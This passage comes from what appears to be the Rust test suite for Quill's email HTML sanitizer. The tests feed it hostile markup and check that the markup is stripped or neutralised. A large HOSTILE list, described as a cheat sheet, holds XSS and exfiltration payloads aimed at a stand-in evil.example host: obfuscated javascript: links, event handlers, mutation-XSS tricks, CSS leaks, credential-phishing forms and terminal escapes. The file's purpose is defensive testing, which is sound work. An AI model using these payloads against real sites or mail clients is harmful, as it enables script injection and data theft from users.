                "<p onclick=\"steal()\" onmouseover=steal() ONLOAD='x'>Hello</p>\
                 <script>steal()</script><script src=\"https://evil.example/x.js\"></script>\
                 <noscript><p>Turn scripts on</p></noscript>\
                 <img src=\"x\" onerror=\"steal()\" alt=\"A chart\">\
                 <body onload=\"steal()\"><div onfocus=\"steal()\" tabindex=\"0\">there</div>"
            ),
            "<p>Hello</p><div>there</div>"
        );
    }

    #[test]
    fn forms_frames_and_embedded_things_are_removed() {
        assert_eq!(
            body(
                "<form action=\"https://evil.example/collect\" method=\"post\">\
                 <label>Password <input type=\"password\" name=\"p\"></label>\
                 <textarea>typed</textarea><select><option>one</option></select>\
                 <button formaction=\"https://evil.example/\">Sign in</button></form>\
                 <iframe src=\"https://evil.example/\">framed</iframe>\
                 <frame src=\"https://evil.example/\">\
                 <object data=\"https://evil.example/x.swf\"><p>fallback</p></object>\
                 <embed src=\"https://evil.example/x.swf\">\
                 <applet code=\"Evil.class\">applet</applet><p>After.</p>"
            ),
            "Password <p>After.</p>"
        );
    }

    #[test]
    fn the_senders_base_link_and_meta_do_not_survive() {
        let html = "<html><head><base href=\"https://evil.example/\">\
                    <meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\
                    <meta http-equiv=\"Content-Security-Policy\" content=\"default-src *\">\
                    <link rel=\"stylesheet\" href=\"https://evil.example/x.css\">\
                    <link rel=\"preload\" href=\"https://evil.example/beacon\" as=\"image\">\
                    <title>Not ours</title></head><body><p>Hello.</p>\
                    <meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\"></body></html>";
        let sanitized = sanitize(html, &options(true));
        assert_eq!(body_of(&sanitized.html), "<p>Hello.</p>");
        assert!(!sanitized.html.contains("evil.example"));
        assert!(!sanitized.html.contains("refresh"));
        assert!(!sanitized.html.contains("Not ours"));
        assert_eq!(sanitized.html.matches("<meta").count(), 4);
        assert_eq!(sanitized.html.matches("<base").count(), 0);
        assert_eq!(sanitized.html.matches("<link").count(), 0);
    }

    #[test]
    fn svg_and_mathml_go_whole() {
        assert_eq!(
            body(
                "<p>Before</p><svg onload=\"steal()\"><script>steal()</script>\
                 <a xlink:href=\"javascript:steal()\"><text>click</text></a>\
                 <foreignObject><p>inside</p></foreignObject>\
                 <image href=\"https://evil.example/pixel.gif\"/></svg>\
                 <math><mi xlink:href=\"javascript:steal()\">x</mi>\
                 <annotation-xml encoding=\"text/html\"><p>inside</p></annotation-xml></math>\
                 <p>After</p>"
            ),
            "<p>Before</p><p>After</p>"
        );
    }

    #[test]
    fn links_survive_only_if_quill_would_open_them() {
        assert_eq!(
            body(
                "<a href=\"https://example.com/a?b=1&amp;c=2\" target=\"_blank\" rel=\"opener\">web</a> \
                 <a href=\"  HTTP://EXAMPLE.COM/x \">shouting</a> \
                 <a href=\"mailto:ana@example.com\">mail</a>"
            ),
            "<a href=\"https://example.com/a?b=1&amp;c=2\" rel=\"noopener noreferrer\">web</a> \
             <a href=\"HTTP://EXAMPLE.COM/x\" rel=\"noopener noreferrer\">shouting</a> \
             <a href=\"mailto:ana@example.com\" rel=\"noopener noreferrer\">mail</a>"
        );
        // Each of these keeps its text and loses its target.
        for href in [
            "javascript:steal()",
            "JaVaScRiPt:steal()",
            " javascript:steal()",
            "java&#9;script:steal()",
            "java&#10;script:steal()",
            "&#1;javascript:steal()",
            "&#x6A;avascript:steal()",
            "javascript&colon;steal()",
            "vbscript:steal()",
            "data:text/html,<script>steal()</script>",
            "data:text/html;base64,PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+",
            "file:///etc/passwd",
            "FILE:///Applications/Calculator.app",
            "x-apple-something://do",
            "tel:+15555550100",
            "ftp://example.com/file",
            "//example.com/protocol-relative",
            "/relative",
            "relative.html",
            "#top",
            "https://example.com/a b",
            "https://ex\u{430}mple.com/",
            "https://",
            "",
        ] {
            let html = format!("<p><a href=\"{href}\">the link</a></p>");
            assert_eq!(body(&html), "<p><a>the link</a></p>", "{href:?}");
            assert_eq!(
                body_with_remote(&html),
                "<p><a>the link</a></p>",
                "{href:?}"
            );
        }
        // An address belongs on a link and nowhere else.
        assert_eq!(
            body("<p href=\"https://example.com/\">not a link</p>"),
            "<p>not a link</p>"
        );
    }

    #[test]
    fn remote_loads_are_blocked_and_counted() {
        let html = "<img src=\"https://example.com/logo.png\" alt=\"Example Works\" width=\"120\">\
                    <img src=\"http://example.com/pixel.gif\" width=\"1\" height=\"1\">\
                    <img src=\"//example.com/protocol-relative.png\" alt=\"\">\
                    <img src=\"https://example.com/a.png\" srcset=\"https://example.com/a.png 1x, https://example.com/b.png 2x\" alt=\"Twice\">\
                    <video src=\"https://example.com/clip.mp4\" poster=\"https://example.com/poster.jpg\" controls>A clip</video>\
                    <audio src=\"https://example.com/clip.mp3\"></audio>\
                    <picture><source srcset=\"https://example.com/wide.webp\" media=\"(min-width: 600px)\"><img src=\"https://example.com/narrow.jpg\" alt=\"Skyline\"></picture>\
                    <table background=\"https://example.com/bg.png\"><tr><td background=\"https://example.com/cell.png\">Cell</td></tr></table>";
        let blocked = sanitize(html, &options(false));
        assert_eq!(
            body_of(&blocked.html),
            "<span class=\"quill-blocked\">Example Works</span>\
             <span class=\"quill-blocked\">Twice</span>\
             <video controls=\"\">A clip</video><audio></audio>\
             <picture><span class=\"quill-blocked\">Skyline</span></picture>\
             <table><tbody><tr><td>Cell</td></tr></tbody></table>"
        );
        // One for each element that would have fetched something: five
        // pictures, the video, the audio, the source, and two backgrounds.
        assert_eq!(blocked.blocked, 10);
        assert!(!blocked.html.contains("example.com"));
        assert_safe(&blocked.html, false);

        let allowed = sanitize(html, &options(true));
        assert_eq!(allowed.blocked, 0);
        assert_eq!(
            body_of(&allowed.html),
            "<img src=\"https://example.com/logo.png\" alt=\"Example Works\" width=\"120\">\
             <img src=\"http://example.com/pixel.gif\" width=\"1\" height=\"1\">\
             <img src=\"https://example.com/protocol-relative.png\" alt=\"\">\
             <img src=\"https://example.com/a.png\" srcset=\"https://example.com/a.png 1x, https://example.com/b.png 2x\" alt=\"Twice\">\
             <video src=\"https://example.com/clip.mp4\" poster=\"https://example.com/poster.jpg\" controls=\"\">A clip</video>\
             <audio src=\"https://example.com/clip.mp3\"></audio>\
             <picture><source srcset=\"https://example.com/wide.webp\" media=\"(min-width: 600px)\"><img src=\"https://example.com/narrow.jpg\" alt=\"Skyline\"></picture>\
             <table background=\"https://example.com/bg.png\"><tbody><tr><td background=\"https://example.com/cell.png\">Cell</td></tr></tbody></table>"
        );
        assert_safe(&allowed.html, true);
    }

    #[test]
    fn what_no_setting_allows_is_dropped_and_not_counted() {
        for remote in [false, true] {
            let sanitized = sanitize(
                "<img src=\"file:///Users/robin/secret.png\" alt=\"A file\">\
                 <img src=\"javascript:steal()\" alt=\"A script\">\
                 <img src=\"data:text/html,<script>steal()</script>\" alt=\"A page\">\
                 <img src=\"data:image/svg+xml,<svg onload='steal()'/>\" alt=\"A drawing\">\
                 <img src=\"logo.png\" alt=\"Relative\">\
                 <img src=\"../../../etc/passwd\" alt=\"Climbing\">\
                 <img src=\"https://example.com/a b.png\" alt=\"Spaced\">\
                 <img srcset=\"logo.png 1x, https://example.com/b.png 2x\" alt=\"Mixed\">\
                 <video src=\"data:video/mp4;base64,AAAA\"></video>\
                 <p src=\"https://example.com/x.png\" poster=\"https://example.com/y.png\">text</p>",
                &options(remote),
            );
            assert_eq!(body_of(&sanitized.html), "<video></video><p>text</p>");
            assert_eq!(sanitized.blocked, 0);
            assert_safe(&sanitized.html, remote);
        }
    }

    #[test]
    fn embedded_pictures_are_kept_in_images_and_nowhere_else() {
        let picture = "data:image/png;base64,iVBORw0KGgo=";
        let html = format!(
            "<img src=\"{picture}\" alt=\"Dot\"><img src=\" DATA:IMAGE/GIF;base64,R0lGODlh \">\
             <div style=\"background: url({picture})\">x</div>\
             <table background=\"{picture}\"><tr><td>y</td></tr></table>\
             <video poster=\"{picture}\"></video>"
        );
        let sanitized = sanitize(&html, &options(false));
        assert_eq!(
            body_of(&sanitized.html),
            format!(
                "<img src=\"{picture}\" alt=\"Dot\"><img src=\"DATA:IMAGE/GIF;base64,R0lGODlh\">\
                 <div style=\"background: none\">x</div>\
                 <table><tbody><tr><td>y</td></tr></tbody></table><video></video>"
            )
        );
        assert_eq!(sanitized.blocked, 0);
        assert_safe(&sanitized.html, false);
    }

    #[test]
    fn inline_parts_are_pointed_at_their_files() {
        let files = |id: &str| match id {
            "logo@example.com" => Some("part 2 (logo).png".to_owned()),
            "chart" => Some("chart.png".to_owned()),
            "sneaky" => Some("..".to_owned()),
            "climb" => Some("../../secret.png".to_owned()),
            _ => None,
        };
        let options = Options {
            remote: false,
            cid_file: &files,
            title: "Report",
        };
        let sanitized = sanitize(
            "<img src=\"cid:logo@example.com\" alt=\"Logo\">\
             <img src=\"CID:chart\"><img src=\"cid:logo%40example.com\">\
             <img src=\"cid:&lt;chart&gt;\"><img src=\"cid:missing\" alt=\"Gone\">\
             <img src=\"cid:sneaky\"><img src=\"cid:climb\"><img src=\"cid:\">\
             <td background=\"cid:chart\">cell</td>\
             <div style=\"background-image: url('cid:chart')\">styled</div>\
             <style>.hero { background: url(cid:logo@example.com) }</style>",
            &options,
        );
        assert_eq!(
            body_of(&sanitized.html),
            "<img src=\"./part%202%20%28logo%29.png\" alt=\"Logo\">\
             <img src=\"./chart.png\"><img src=\"./part%202%20%28logo%29.png\">\
             <img src=\"./chart.png\">\
             <img src=\"./..%2F..%2Fsecret.png\">\
             cell\
             <div style=\"background-image: url(&quot;./chart.png&quot;)\">styled</div>\
             <style>.hero { background: url(\"./part%202%20%28logo%29.png\") }</style>"
        );
        assert_eq!(sanitized.inline, ["logo@example.com", "chart", "climb"]);
        assert_eq!(sanitized.blocked, 0);
        assert_safe(&sanitized.html, false);
    }

    #[test]
    fn css_in_attributes_is_judged_url_by_url() {
        for (style, kept) in [
            (
                "color: red; font-size: 14px",
                Some("color: red; font-size: 14px"),
            ),
            (
                "background: url(https://example.com/bg.png) no-repeat",
                Some("background: none no-repeat"),
            ),
            (
                "background:URL( 'https://example.com/bg.png' );color:red",
                Some("background:none;color:red"),
            ),
            (
                "background: url(\"//example.com/bg.png\")",
                Some("background: none"),
            ),
            (
                "background: url(/* hidden */https://example.com/bg.png)",
                Some("background: none"),
            ),
            (
                "list-style-image: url(file:///etc/passwd)",
                Some("list-style-image: none"),
            ),
            ("background: url(logo.png)", Some("background: none")),
            // Somewhere on the network named outside any `url()`.
            ("content: 'https://example.com/x.png'", None),
            ("background: red; // see //example.com/x.png", None),
            // No safe reading: the whole attribute goes.
            ("background: u\\72l(https://example.com/bg.png)", None),
            ("background: url(https://example.com/bg.png", None),
            ("background: url('https://example.com/bg.png)", None),
            ("width: expression(steal())", None),
            (
                "background: image-set('https://example.com/a.png' 1x)",
                None,
            ),
            ("background: -webkit-image-set(url(a.png) 1x)", None),
            ("background-image: image('https://example.com/a.png')", None),
            ("@import 'https://example.com/x.css'", None),
            ("  ", None),
        ] {
            let html = format!("<p style=\"{}\">x</p>", style.replace('"', "&quot;"));
            let expected = match kept {
                Some(kept) => format!("<p style=\"{}\">x</p>", kept.replace('"', "&quot;")),
                None => "<p>x</p>".to_owned(),
            };
            assert_eq!(body(&html), expected, "{style:?}");
        }
        let counted = sanitize(
            "<p style=\"background: url(https://example.com/a.png), url(https://example.com/b.png)\">x</p>",
            &options(false),
        );
        assert_eq!(counted.blocked, 2);
        let allowed = sanitize(
            "<p style=\"background: url( https://example.com/a.png )\">x</p>",
            &options(true),
        );
        assert_eq!(
            body_of(&allowed.html),
            "<p style=\"background: url(&quot;https://example.com/a.png&quot;)\">x</p>"
        );
        assert_eq!(allowed.blocked, 0);
    }

    #[test]
    fn style_blocks_are_kept_when_they_can_be_read_safely() {
        let html = "<style type=\"text/css\" media=\"screen\"><!--\n\
                    .hero { color: #333; background: url(https://example.com/hero.jpg) }\n\
                    /* a comment with url(https://example.com/never.png) in it */\n\
                    @media (max-width: 600px) { .hero { font-size: 14px } }\n\
                    @font-face { font-family: Example; src: url(\"https://example.com/font.woff2\") }\n\
                    --></style><p class=\"hero\">Hello.</p>";
        let blocked = sanitize(html, &options(false));
        assert_eq!(
            body_of(&blocked.html),
            "<style media=\"screen\">\n\
             .hero { color: #333; background: none }\n\n\
             @media (max-width: 600px) { .hero { font-size: 14px } }\n\
             @font-face { font-family: Example; src: none }\n\
             </style><p class=\"hero\">Hello.</p>"
        );
        assert_eq!(blocked.blocked, 2);
        assert_safe(&blocked.html, false);

        let allowed = sanitize(html, &options(true));
        assert!(
            allowed
                .html
                .contains("url(\"https://example.com/hero.jpg\")")
        );
        assert!(
            allowed
                .html
                .contains("url(\"https://example.com/font.woff2\")")
        );
        assert!(!allowed.html.contains("never.png"));
        assert_eq!(allowed.blocked, 0);
        assert_safe(&allowed.html, true);
    }

    #[test]
    fn imports_are_cut_out_whatever_is_allowed() {
        for remote in [false, true] {
            let sanitized = sanitize(
                "<style>@import url(https://example.com/a.css);\n\
                 @IMPORT 'https://example.com/b.css' screen;\n\
                 p { color: red }\n\
                 @import \"https://example.com/c.css\"</style><p>x</p>",
                &options(remote),
            );
            assert_eq!(
                body_of(&sanitized.html),
                "<style>\n\np { color: red }\n</style><p>x</p>"
            );
            // Nothing that allowing remote content would bring back.
            assert_eq!(sanitized.blocked, 0);
            assert_safe(&sanitized.html, remote);
        }
    }

    #[test]
    fn a_style_block_with_no_safe_reading_is_dropped_whole() {
        for css in [
            "p { background: u\\72l(https://example.com/x.png) }",
            "p::before { content: '<img src=x onerror=steal()>' }",
            "p { width: expression(steal()) }",
            "p { background: image-set('https://example.com/a.png' 1x) }",
            "p { background: url(https://example.com/x.png }",
            "p { -moz-binding: url(https://example.com/x.xml#steal) }",
            "@import 'a.css' /* never ends",
        ] {
            let html = format!("<style>{css}</style><p>Kept.</p>");
            for remote in [false, true] {
                let sanitized = sanitize(&html, &options(remote));
                assert!(!sanitized.html.contains("steal"), "{css:?}");
                assert!(sanitized.html.contains("<p>Kept.</p>"), "{css:?}");
                assert_eq!(sanitized.html.matches("<style").count(), 1, "{css:?}");
                assert_eq!(sanitized.blocked, 0, "{css:?}");
                assert_safe(&sanitized.html, remote);
            }
        }
        // Not CSS at all.
        assert_eq!(
            body("<style type=\"text/x-other\">p { color: red }</style><p>x</p>"),
            "<p>x</p>"
        );
        // A block ends where the parser says it ends, and what follows is
        // judged as markup.
        assert_eq!(
            body("<style>p { color: red } </style><script>steal()</script><style><p>x</p>"),
            "<style>p { color: red } </style>"
        );
    }

    #[test]
    fn escape_sequences_do_not_reach_the_page() {
        let sanitized = sanitize(
            "<p title=\"\u{1b}]0;pwned\u{7}tip&#27;[2J\">\u{1b}[31mred\u{1b}[0m &#27;]52;c;cm0=&#7;text\u{0}\u{8}\u{9b}0m</p>\
             <a href=\"https://example.com/\u{1b}[31m\">link</a>",
            &options(false),
        );
        assert_eq!(
            body_of(&sanitized.html),
            "<p title=\"tip\">red text</p><a href=\"https://example.com/\" rel=\"noopener noreferrer\">link</a>"
        );
        assert_safe(&sanitized.html, false);
    }

    #[test]
    fn input_too_large_is_not_processed() {
        let huge = "<p>word</p>".repeat(MAX_HTML_BYTES / 11 + 1);
        let started = std::time::Instant::now();
        let sanitized = sanitize(&huge, &options(true));
        assert!(started.elapsed().as_millis() < 500);
        assert_eq!(
            body_of(&sanitized.html),
            format!("<p class=\"quill-notice\">{TOO_LARGE}</p>")
        );
        assert!(sanitized.html.len() < 2048);
        assert_eq!((sanitized.blocked, sanitized.inline.len()), (0, 0));
        assert_safe(&sanitized.html, true);
    }

    #[test]
    fn nesting_too_deep_to_parse_in_time_is_not_shown() {
        // Five thousand deep is parsed and comes through.
        let deep = "<div>".repeat(5_000) + "deep";
        assert!(body(&deep).contains("deep"));
        // A hundred thousand would take minutes. It gets the time allowed
        // and then a notice in its place.
        // And so do forty kilobytes that would become four million
        // elements, and a megabyte of non-breaking spaces that the writer
        // would look through once for each.
        let deeper = "<div>".repeat(100_000) + "deep";
        let growing: String = (0..3_000).map(|n| format!("<b id={n}><p>x")).collect();
        let spaces = "&nbsp;".repeat(200_000);
        for hostile in [deeper, growing, spaces] {
            let started = std::time::Instant::now();
            let sanitized = sanitize(&hostile, &options(true));
            assert!(started.elapsed() < 8 * guard::allowance(hostile.len()));
            assert_eq!(
                body_of(&sanitized.html),
                format!("<p class=\"quill-notice\">{CANNOT_SHOW}</p>")
            );
            assert_eq!((sanitized.blocked, sanitized.inline.len()), (0, 0));
            assert_safe(&sanitized.html, true);
        }
        // Ordinary amounts of the same things are nothing to worry about.
        let ordinary = "<p><b>Bold</b>&nbsp;and&nbsp;&amp;&nbsp;plain.</p>".repeat(2_000);
        assert_eq!(body(&ordinary), ordinary);
    }

    /// A cheat sheet's worth of ways to get something past a sanitizer.
    const HOSTILE: &[&str] = &[
        "<script>steal()</script>",
        "<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
        "<scr<script>ipt>steal()</scr</script>ipt>",
        "<<script>steal();//<</script>",
        "<script/src=\"https://evil.example/x.js\"></script>",
        "<script\n>steal()</script\n>",
        "<script>steal()",
        "</script><script>steal()</script>",
        "<img src=x onerror=steal()>",
        "<img src=x onerror=\"steal()\" alt=\"x\">",
        "<img/src=\"x\"/onerror=steal()>",
        "<img src=\"x\"onerror=\"steal()\">",
        "<img src=x:x onerror=steal() x=\">\">",
        "<img \"\"\"><script>steal()</script>\">",
        "<img src=`x`onerror=steal()>",
        "<img src=\"javascript:steal()\">",
        "<img src=\"jav\tascript:steal()\">",
        "<img src=\"jav&#x0A;ascript:steal()\">",
        "<img src=\" &#14;  javascript:steal()\">",
        "<img src=\"https://evil.example/pixel.gif?who=robin\" width=1 height=1>",
        "<img src=\"//evil.example/pixel.gif\">",
        "<img src=\"\\\\evil.example\\pixel.gif\">",
        "<img src=\"/\\evil.example/pixel.gif\">",
        "<img src=\"https:evil.example/pixel.gif\">",
        "<img src=\"h\nttps://evil.example/pixel.gif\">",
        "<img srcset=\"https://evil.example/a.png 1x, https://evil.example/b.png 2x\">",
        "<img src=\"x\" srcset=\"//evil.example/a.png 2x\">",
        "<img lowsrc=\"https://evil.example/a.png\" dynsrc=\"https://evil.example/b.avi\">",
        "<picture><source srcset=\"https://evil.example/a.webp\"><img src=\"x\"></picture>",
        "<video src=\"https://evil.example/a.mp4\" poster=\"https://evil.example/p.jpg\" autoplay onplay=steal()></video>",
        "<video><source src=\"https://evil.example/a.mp4\" onerror=steal()><track src=\"https://evil.example/t.vtt\"></video>",
        "<audio src=\"https://evil.example/a.mp3\" autoplay></audio>",
        "<body background=\"https://evil.example/bg.png\" onload=steal()>",
        "<table background=\"https://evil.example/bg.png\"><tr><td background=\"javascript:steal()\">x</td></tr></table>",
        "<a href=\"javascript:steal()\">x</a>",
        "<a href=\"jaVasCript:steal()\">x</a>",
        "<a href=\"java\tscript:steal()\">x</a>",
        "<a href=\"java&#13;script:steal()\">x</a>",
        "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;steal()\">x</a>",
        "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;steal()\">x</a>",
        "<a href=\"&#0000106avascript:steal()\">x</a>",
        "<a href=\"\u{1}javascript:steal()\">x</a>",
        "<a href=\"  javascript:steal()\">x</a>",
        "<a href=\"javascript&colon;steal()\">x</a>",
        "<a href=\"vbscript:steal()\">x</a>",
        "<a href=\"data:text/html,<script>steal()</script>\">x</a>",
        "<a href=\"data:text/html;base64,PHNjcmlwdD5zdGVhbCgpPC9zY3JpcHQ+\">x</a>",
        "<a href=\"file:///etc/passwd\">x</a>",
        "<a href=\"file:///Applications/Calculator.app\">x</a>",
        "<a href=\"https://example.com/\" onclick=\"steal()\" ping=\"https://evil.example/ping\">x</a>",
        "<a href=\"https://example.com/\" target=\"_blank\" rel=\"opener\">x</a>",
        "<a href=\"https://example.com/\"><img src=\"https://evil.example/a.png\" alt=\"x\"></a>",
        "<a xlink:href=\"javascript:steal()\">x</a>",
        "<area href=\"javascript:steal()\" shape=\"rect\" coords=\"0,0,10,10\">",
        "<form action=\"https://evil.example/collect\"><input name=\"password\" type=\"password\"><input type=\"submit\"></form>",
        "<form><button formaction=\"javascript:steal()\">x</button></form>",
        "<input type=\"image\" src=\"https://evil.example/a.png\" onfocus=steal() autofocus>",
        "<isindex action=\"javascript:steal()\" type=\"image\">",
        "<textarea onfocus=steal() autofocus>x</textarea>",
        "<select onchange=steal()><option>x</option></select>",
        "<details open ontoggle=steal()>x</details>",
        "<marquee onstart=steal()>x</marquee>",
        "<div onpointerover=\"steal()\" style=\"position:fixed;inset:0\">x</div>",
        "<iframe src=\"https://evil.example/\"></iframe>",
        "<iframe srcdoc=\"<script>steal()</script>\"></iframe>",
        "<iframe src=\"javascript:steal()\"></iframe>",
        "<frameset><frame src=\"https://evil.example/\"></frameset>",
        "<object data=\"https://evil.example/x.swf\" type=\"application/x-shockwave-flash\"></object>",
        "<object data=\"javascript:steal()\"></object>",
        "<embed src=\"https://evil.example/x.swf\">",
        "<embed src=\"javascript:steal()\">",
        "<applet code=\"Evil.class\" codebase=\"https://evil.example/\"></applet>",
        "<base href=\"https://evil.example/\"><a href=\"/login\">x</a>",
        "<base href=\"javascript:steal()//\">",
        "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">",
        "<link rel=\"prefetch\" href=\"https://evil.example/beacon\">",
        "<link rel=\"import\" href=\"https://evil.example/x.html\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:steal()\">",
        "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; script-src 'unsafe-inline'\">",
        "<meta http-equiv=\"Set-Cookie\" content=\"session=stolen\">",
        "<svg onload=steal()></svg>",
        "<svg><script>steal()</script></svg>",
        "<svg><script href=\"https://evil.example/x.js\"/></svg>",
        "<svg><a xlink:href=\"javascript:steal()\"><text y=\"20\">x</text></a></svg>",
        "<svg><image href=\"https://evil.example/pixel.gif\"/></svg>",
        "<svg><use href=\"https://evil.example/x.svg#a\"/></svg>",
        "<svg><animate onbegin=steal() attributeName=x dur=1s>",
        "<svg><set attributeName=\"href\" to=\"javascript:steal()\"/></svg>",
        "<svg><foreignObject><iframe src=\"https://evil.example/\"></iframe></foreignObject></svg>",
        "<svg><style><img src=x onerror=steal()></style></svg>",
        "<svg></p><style><a id=\"</style><img src=x onerror=steal()>\">",
        "<math><mi xlink:href=\"javascript:steal()\">x</mi></math>",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=x onerror=steal()&gt;\">",
        "<math><annotation-xml encoding=\"text/html\"><script>steal()</script></annotation-xml></math>",
        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=steal()>",
        "<noscript><p title=\"</noscript><img src=x onerror=steal()>\">",
        "<noscript><img src=\"https://evil.example/pixel.gif\"></noscript>",
        "<template><script>steal()</script></template>",
        "<xmp><script>steal()</script></xmp>",
        "<plaintext><script>steal()</script>",
        "<listing><script>steal()</script></listing>",
        "<title><script>steal()</script></title>",
        "<textarea></textarea><script>steal()</script>",
        "<!--<script>steal()</script>-->",
        "<!--[if gte IE 4]><script>steal()</script><![endif]-->",
        "<![CDATA[<script>steal()</script>]]>",
        "<?xml version=\"1.0\"?><?xml-stylesheet href=\"https://evil.example/x.xsl\"?>",
        "<!DOCTYPE html [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><p>&x;</p>",
        "<style>@import 'https://evil.example/x.css';</style>",
        "<style>@import url(https://evil.example/x.css);</style>",
        "<style>@IMPORT \"//evil.example/x.css\";</style>",
        "<style>@im\\port 'https://evil.example/x.css';</style>",
        "<style>@import/**/'https://evil.example/x.css';</style>",
        "<style>p { background: url(https://evil.example/a.png) }</style>",
        "<style>p { background: URL(\"https://evil.example/a.png\") }</style>",
        "<style>p { background: url( 'https://evil.example/a.png' ) }</style>",
        "<style>p { background: url(//evil.example/a.png) }</style>",
        "<style>p { background: u\\72l(https://evil.example/a.png) }</style>",
        "<style>p { background: \\75\\72\\6c(https://evil.example/a.png) }</style>",
        "<style>p { background: url(\\68ttps://evil.example/a.png) }</style>",
        "<style>p { background: url(ht/**/tps://evil.example/a.png) }</style>",
        "<style>p { background: url(\nhttps://evil.example/a.png\n) }</style>",
        "<style>p { background: image-set('https://evil.example/a.png' 1x) }</style>",
        "<style>p { background: -webkit-image-set(url(https://evil.example/a.png) 1x) }</style>",
        "<style>p { background: image('https://evil.example/a.png') }</style>",
        "<style>p { background: cross-fade(url(https://evil.example/a.png), url(https://evil.example/b.png)) }</style>",
        "<style>@font-face { font-family: x; src: url(https://evil.example/x.woff) } p { font-family: x }</style>",
        "<style>p { list-style-image: url(https://evil.example/a.png); cursor: url(https://evil.example/c.cur), auto }</style>",
        "<style>p { width: expression(steal()) }</style>",
        "<style>p { -moz-binding: url(https://evil.example/x.xml#x) }</style>",
        "<style>p { behavior: url(https://evil.example/x.htc) }</style>",
        "<style>p { background: url(javascript:steal()) }</style>",
        "<style>input[value^=a] { background: url(https://evil.example/leak?a) }</style>",
        "<style></style><script>steal()</script>",
        "<style>p { color: red } </style><script>steal()</script><style>",
        "<style><!--</style><script>steal()</script>--></style>",
        "<style>p::after { content: '</style><script>steal()</script>' }</style>",
        "<style>@charset \"utf-7\"; +ADw-script+AD4-steal()+ADw-/script+AD4-</style>",
        "<style>@namespace url(https://evil.example/ns);</style>",
        "<style media=\"screen and (min-width:0)\" onload=steal()>p{color:red}</style>",
        "<style>p { background: url(https://evil.example/a.png",
        "<p style=\"background: url(https://evil.example/a.png)\">x</p>",
        "<p style=\"background: URL('https://evil.example/a.png')\">x</p>",
        "<p style=\"background:url(&quot;https://evil.example/a.png&quot;)\">x</p>",
        "<p style=\"background: url(&#104;ttps://evil.example/a.png)\">x</p>",
        "<p style=\"background: u\\72l(https://evil.example/a.png)\">x</p>",
        "<p style=\"background: url(//evil.example/a.png)\">x</p>",
        "<p style=\"background-image: image-set('https://evil.example/a.png' 1x)\">x</p>",
        "<p style=\"width: expression(steal())\">x</p>",
        "<p style=\"width: expr/**/ession(steal())\">x</p>",
        "<p style=\"background: url(javascript:steal())\">x</p>",
        "<p style=\"@import 'https://evil.example/x.css'\">x</p>",
        "<p style=\"x:</style><script>steal()</script>\">x</p>",
        "<p style=\"background: url(https://evil.example/a.png\">x</p>",
        "<p style='font-family: \"x\"; background: url(\"https://evil.example/a.png\")'>x</p>",
        "<div style=\"background:url(https://evil.example/a.png);background:url(https://evil.example/b.png)\">x</div>",
        "<p title=\"&quot; onmouseover=&quot;steal()\">x</p>",
        "<p title='\" onmouseover=\"steal()'>x</p>",
        "<p title=\"><script>steal()</script>\">x</p>",
        "<p class=\"x\" id=\"y\" onclick=steal() ONCLICK=steal() OnClick=steal()>x</p>",
        "<p onclick\n=\n\"steal()\">x</p>",
        "<p on=\"steal()\" one=\"steal()\" onx=\"steal()\">x</p>",
        "<p contenteditable onpaste=steal() onbeforeinput=steal()>x</p>",
        "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\"><a href=\"https://evil.example/\">x</a></div>",
        "<a href=\"https://example.com/\u{1b}]8;;https://evil.example/\u{7}\">x</a>",
        "<p>\u{1b}]0;pwned\u{7}\u{1b}[2J\u{9b}31m&#27;c x</p>",
        "<b><i><u><a href=\"https://example.com/\"><p><div><table><tr><td><b><i>",
        "<table><tr><td><table><tr><td><a href=\"javascript:steal()\">",
        "<p><b><i></p></b></i><p onclick=steal()>x",
        "<a href=\"javascript:steal()\"",
        "<img src=\"https://evil.example/a.png",
        "<p style=\"background:url(https://evil.example/a.png)",
        "<",
        "<<<<>>>>",
        "</",
        "</p></div></script></style>",
        "<a",
        "<a href",
        "<a href=",
        "<a href=\"",
        "&",
        "&#",
        "&#x;&#99999999;&#xD800;&#0;&bogus;",
        "\u{0}\u{0}\u{0}",
        "\u{feff}<p>x</p>",
        "",
    ];

    #[test]
    fn hostile_markup_is_made_harmless() {
        let logo = |id: &str| (id == "logo").then(|| "logo.png".to_owned());
        let mut snippets: Vec<String> = HOSTILE
            .iter()
            .map(|snippet| (*snippet).to_owned())
            .collect();
        // Each one again inside ordinary markup, inside a table, with its
        // case changed, and cut off halfway.
        for snippet in HOSTILE {
            snippets.push(format!(
                "<div><p>Dear Robin,</p>{snippet}<p>Regards</p></div>"
            ));
            snippets.push(format!("<table><tr><td>{snippet}</td></tr></table>"));
            snippets.push(snippet.to_ascii_uppercase());
            snippets.push(snippet[..snippet.floor_char_boundary(snippet.len() / 2)].to_owned());
            snippets.push(format!(
                "<img src=\"cid:logo\">{snippet}<img src=\"cid:logo\">"
            ));
        }
        // And deep inside others.
        snippets.push("<div>".repeat(500) + &HOSTILE.concat());
        snippets.push("<b><i><span>".repeat(300) + &HOSTILE.concat());
        snippets.push("<table><tr><td>".repeat(200) + &HOSTILE.concat());
        snippets.push("<blockquote><ul><li>".repeat(200) + &HOSTILE.concat());

        for snippet in &snippets {
            for remote in [false, true] {
                let options = Options {
                    remote,
                    cid_file: &logo,
                    title: snippet,
                };
                let sanitized = sanitize(snippet, &options);
                assert_safe(&sanitized.html, remote);
                let lower = sanitized.html.to_ascii_lowercase();
                // None of these has the word in its text, so it must not
                // be anywhere.
                if !snippet.to_ascii_lowercase().contains("javascript") {
                    assert!(!lower.contains("javascript:"), "{snippet:?}");
                }
                if !remote {
                    // Nothing of the attacker's server is left in anything
                    // that loads; a link to it may remain.
                    let (found, styles) = tags(body_of(&sanitized.html));
                    for (_, attributes) in &found {
                        for (name, value) in attributes {
                            assert!(
                                name == "href"
                                    || name == "title"
